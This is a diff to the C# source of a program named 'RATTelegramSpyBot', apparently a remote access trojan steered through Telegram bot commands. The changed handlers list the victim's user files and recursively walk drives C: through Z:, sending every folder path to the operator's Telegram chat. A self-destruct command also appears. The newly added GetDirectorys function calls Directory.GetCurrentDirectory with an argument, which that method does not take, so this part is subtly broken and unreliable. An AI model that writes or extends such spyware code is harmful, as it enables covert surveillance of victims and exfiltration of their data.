@@ -131,14 +131,15 @@ namespace RATTelegramSpyBot {
                     break;
                 #endregion
                 case "/Dir_CurrentUserFiles":
-                    #region
+                    #region /Dir_CurrentUserfiles
                     ListarFiles(@"C: \Users\" + UserName);
                     SendBotMessage("Finish Command");
                     break;
-                    #endregion
+                    #endregion 
                 case "/Dir_CurrentUserFolders":
                     #region
-                    
+                    ListarFiles(@"C: \Users\" + UserName);
+                    SendBotMessage("Finish Command");
                     break;
                 #endregion
 
@@ -322,29 +323,29 @@ namespace RATTelegramSpyBot {
                 case "GetDesktopO":   GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Escritorio"); SendBotMessage("Finish Command"); break;
                 // "/DirDisk"
                
-                case "DDC":    GetDirectoryAll(@"C:\"); SendBotMessage("Finish Command"); break;
-                case "DDD":    GetDirectoryAll(@"D:\"); SendBotMessage("Finish Command"); break;
-                case "DDE":    GetDirectoryAll(@"E:\"); SendBotMessage("Finish Command"); break;
-                case "DDF":    GetDirectoryAll(@"F:\"); SendBotMessage("Finish Command"); break;
-                case "DDG":    GetDirectoryAll(@"G:\"); SendBotMessage("Finish Command"); break;
-                case "DDH":    GetDirectoryAll(@"H:\"); SendBotMessage("Finish Command"); break;
-                case "DDI":    GetDirectoryAll(@"I:\"); SendBotMessage("Finish Command"); break;
-                case "DDJ":    GetDirectoryAll(@"J:\"); SendBotMessage("Finish Command"); break;
-                case "DDK":    GetDirectoryAll(@"K:\"); SendBotMessage("Finish Command"); break;
-                case "DDL":    GetDirectoryAll(@"L:\"); SendBotMessage("Finish Command"); break;
-                case "DDM":    GetDirectoryAll(@"M:\"); SendBotMessage("Finish Command"); break;
-                case "DDN":    GetDirectoryAll(@"N:\"); SendBotMessage("Finish Command"); break;
-                case "DDO":    GetDirectoryAll(@"O:\"); SendBotMessage("Finish Command"); break;
-                case "DDP":    GetDirectoryAll(@"P:\"); SendBotMessage("Finish Command"); break;
-                case "DDQ":    GetDirectoryAll(@"Q:\"); SendBotMessage("Finish Command"); break;
-                case "DDR":    GetDirectoryAll(@"R:\"); SendBotMessage("Finish Command"); break;
-                case "DDS":    GetDirectoryAll(@"S:\"); SendBotMessage("Finish Command"); break;
-                case "DDT":    GetDirectoryAll(@"T:\"); SendBotMessage("Finish Command"); break;
-                case "DDU":    GetDirectoryAll(@"U:\"); SendBotMessage("Finish Command"); break;
-                case "DDV":    GetDirectoryAll(@"V:\"); SendBotMessage("Finish Command"); break;
-                case "DDW":    GetDirectoryAll(@"W:\"); SendBotMessage("Finish Command"); break;
-                case "DDX":    GetDirectoryAll(@"X:\"); SendBotMessage("Finish Command"); break;
-                case "DDZ":    GetDirectoryAll(@"Z:\"); SendBotMessage("Finish Command"); break;
+                case "DDC":    GetFoldersAll(@"C:\"); SendBotMessage("Finish Command"); break;
+                case "DDD":    GetFoldersAll(@"D:\"); SendBotMessage("Finish Command"); break;
+                case "DDE":    GetFoldersAll(@"E:\"); SendBotMessage("Finish Command"); break;
+                case "DDF":    GetFoldersAll(@"F:\"); SendBotMessage("Finish Command"); break;
+                case "DDG":    GetFoldersAll(@"G:\"); SendBotMessage("Finish Command"); break;
+                case "DDH":    GetFoldersAll(@"H:\"); SendBotMessage("Finish Command"); break;
+                case "DDI":    GetFoldersAll(@"I:\"); SendBotMessage("Finish Command"); break;
+                case "DDJ":    GetFoldersAll(@"J:\"); SendBotMessage("Finish Command"); break;
+                case "DDK":    GetFoldersAll(@"K:\"); SendBotMessage("Finish Command"); break;
+                case "DDL":    GetFoldersAll(@"L:\"); SendBotMessage("Finish Command"); break;
+                case "DDM":    GetFoldersAll(@"M:\"); SendBotMessage("Finish Command"); break;
+                case "DDN":    GetFoldersAll(@"N:\"); SendBotMessage("Finish Command"); break;
+                case "DDO":    GetFoldersAll(@"O:\"); SendBotMessage("Finish Command"); break;
+                case "DDP":    GetFoldersAll(@"P:\"); SendBotMessage("Finish Command"); break;
+                case "DDQ":    GetFoldersAll(@"Q:\"); SendBotMessage("Finish Command"); break;
+                case "DDR":    GetFoldersAll(@"R:\"); SendBotMessage("Finish Command"); break;
+                case "DDS":    GetFoldersAll(@"S:\"); SendBotMessage("Finish Command"); break;
+                case "DDT":    GetFoldersAll(@"T:\"); SendBotMessage("Finish Command"); break;
+                case "DDU":    GetFoldersAll(@"U:\"); SendBotMessage("Finish Command"); break;
+                case "DDV":    GetFoldersAll(@"V:\"); SendBotMessage("Finish Command"); break;
+                case "DDW":    GetFoldersAll(@"W:\"); SendBotMessage("Finish Command"); break;
+                case "DDX":    GetFoldersAll(@"X:\"); SendBotMessage("Finish Command"); break;
+                case "DDZ":    GetFoldersAll(@"Z:\"); SendBotMessage("Finish Command"); break;
                 // Destroy RAT Telegram
 
                 case "DestroyRATTrue":
@@ -474,7 +475,26 @@ namespace RATTelegramSpyBot {
         }
 
         #region Funciones Complementarias [importantes] 
-        private static async void GetDirectoryAll(string path, int indent = 0) {
+        private static async void GetDirectorys(string path, int indent = 0) {
+            try {
+                try {
+                    if ((File.GetAttributes(path) & FileAttributes.ReparsePoint) != FileAttributes.ReparsePoint) {
+                        foreach (string folder in Directory.GetCurrentDirectory(path)) {
+                            //Console.WriteLine( "{0}{1}", new string(' ', indent), Path.GetFileName(folder));
+
+                            await Bot.SendTextMessageAsync(config.ID, folder);
+
+                            GetFoldersAll(folder, indent + 2);
+                        }
+                    }
+                } catch (UnauthorizedAccessException) { }
+
+            } catch {   // Si no encuentra el directorio
+                await Bot.SendTextMessageAsync(config.ID, "No se encontró ese directorio en ésta computadora");
+            }
+        }
+
+        private static async void GetFoldersAll(string path, int indent = 0) {
             try {
                 try {
                     if ((File.GetAttributes(path) & FileAttributes.ReparsePoint) != FileAttributes.ReparsePoint) {
@@ -483,7 +503,7 @@ namespace RATTelegramSpyBot {
 
                             await Bot.SendTextMessageAsync(config.ID, folder);
 
-                            GetDirectoryAll(folder, indent + 2);
+                            GetFoldersAll(folder, indent + 2);
                         }
                     }
                 } catch (UnauthorizedAccessException) { }
